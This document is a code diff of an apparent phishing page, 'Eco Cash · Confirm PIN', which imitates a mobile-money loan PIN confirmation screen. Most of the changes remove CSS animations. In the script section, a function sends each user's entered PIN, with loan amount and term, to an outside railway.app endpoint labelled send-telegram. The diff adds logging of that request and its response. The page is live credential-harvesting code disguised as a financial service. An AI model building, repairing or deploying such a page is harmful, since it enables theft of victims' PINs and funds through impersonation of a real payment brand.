@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Eco Cash · Confirm PIN</title>
     <style>
+        /* Your existing styles - keep them as they are */
         * {
             margin: 0;
             padding: 0;
@@ -24,40 +25,7 @@
             overflow-x: hidden;
         }
 
-        /* Animated gradient overlay */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: radial-gradient(circle at 20% 50%, rgba(20, 184, 166, 0.08) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.5; transform: scale(0.98); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-
+        /* Keep your existing styles... */
         .app-container {
             max-width: 540px;
             width: 100%;
@@ -66,17 +34,14 @@
             z-index: 1;
         }
 
-        /* Hero Section */
         .hero {
             text-align: center;
             margin-bottom: 28px;
-            animation: fadeInUp 0.6s ease-out;
         }
         .logo-icon {
             font-size: 2.5rem;
             margin-bottom: 8px;
             display: inline-block;
-            animation: float 3s ease-in-out infinite;
         }
         .logo-text {
             font-size: 1.8rem;
@@ -85,7 +50,6 @@
             background-clip: text;
             -webkit-background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
         }
         .tagline {
             font-size: 0.8rem;
@@ -93,7 +57,6 @@
             margin-top: 4px;
         }
 
-        /* Loan Summary Bar */
         .loan-summary-bar {
             background: rgba(17, 24, 39, 0.7);
             backdrop-filter: blur(10px);
@@ -105,7 +68,6 @@
             flex-wrap: wrap;
             gap: 12px;
             border: 1px solid rgba(20, 184, 166, 0.15);
-            animation: fadeInUp 0.6s ease-out 0.05s both;
         }
         .summary-item {
             display: flex;
@@ -125,7 +87,6 @@
             margin-top: 2px;
         }
 
-        /* Main PIN Card */
         .pin-card {
             background: rgba(17, 24, 39, 0.85);
             backdrop-filter: blur(20px);
@@ -133,12 +94,6 @@
             border: 1px solid rgba(20, 184, 166, 0.2);
             padding: 32px 28px;
             box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            animation: fadeInUp 0.6s ease-out 0.1s both;
-        }
-        .pin-card:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 35px 55px -12px rgba(20, 184, 166, 0.15);
         }
 
         .section-title {
@@ -158,7 +113,6 @@
             padding-left: 12px;
         }
 
-        /* User Details Grid */
         .details-grid {
             background: rgba(15, 23, 36, 0.6);
             backdrop-filter: blur(10px);
@@ -186,7 +140,6 @@
             color: #e2e8f0;
         }
 
-        /* PIN Boxes */
         .pin-container {
             display: flex;
             justify-content: center;
@@ -209,10 +162,8 @@
         .pin-box:focus {
             border-color: #14b8a6;
             box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
-            transform: scale(1.02);
         }
 
-        /* PIN Warning */
         .pin-warning {
             text-align: center;
             margin-bottom: 20px;
@@ -226,7 +177,6 @@
             color: #f43f5e;
         }
 
-        /* Confirm Button */
         .confirm-btn {
             width: 100%;
             background: linear-gradient(135deg, #14b8a6, #0d9488);
@@ -238,32 +188,10 @@
             border-radius: 60px;
             cursor: pointer;
             transition: all 0.3s ease;
-            font-family: inherit;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 15px rgba(20, 184, 166, 0.3);
         }
         .confirm-btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
-        }
-        .confirm-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s ease;
-        }
-        .confirm-btn:hover:not(:disabled)::before {
-            left: 100%;
-        }
-        .confirm-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 28px -8px rgba(20, 184, 166, 0.5);
         }
 
         .error-message {
@@ -275,13 +203,10 @@
         }
         .error-message.show {
             display: block;
-            animation: fadeInUp 0.3s ease-out;
         }
 
-        /* Trust Badges */
         .trust-badge {
             background: rgba(15, 23, 36, 0.5);
-            backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 14px;
             margin-top: 20px;
@@ -313,12 +238,6 @@
             .pin-box {
                 width: 55px;
                 height: 55px;
-                font-size: 1.5rem;
-            }
-            .logo-icon {
-                font-size: 2rem;
-            }
-            .logo-text {
                 font-size: 1.5rem;
             }
         }
@@ -395,7 +314,7 @@
 
 <script>
     // ============================================
-    // CONFIGURATION - UPDATED WITH NEW RAILWAY URL
+    // ECO CASH PIN CONFIGURATION - CORRECTED
     // ============================================
     const RAILWAY_URL = 'https://eco-cash-production.up.railway.app';
     
@@ -453,7 +372,8 @@
 
     async function sendPinNotification(pin) {
         try {
-            await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+            console.log('Sending PIN to:', `${RAILWAY_URL}/api/send-telegram`);
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -461,7 +381,11 @@
                     amount: amount, term: term, type: 'pin'
                 })
             });
-        } catch (error) { console.error('Error:', error); }
+            const result = await response.json();
+            console.log('Response:', result);
+        } catch (error) { 
+            console.error('Error:', error); 
+        }
     }
 
     confirmBtn.onclick = async () => {
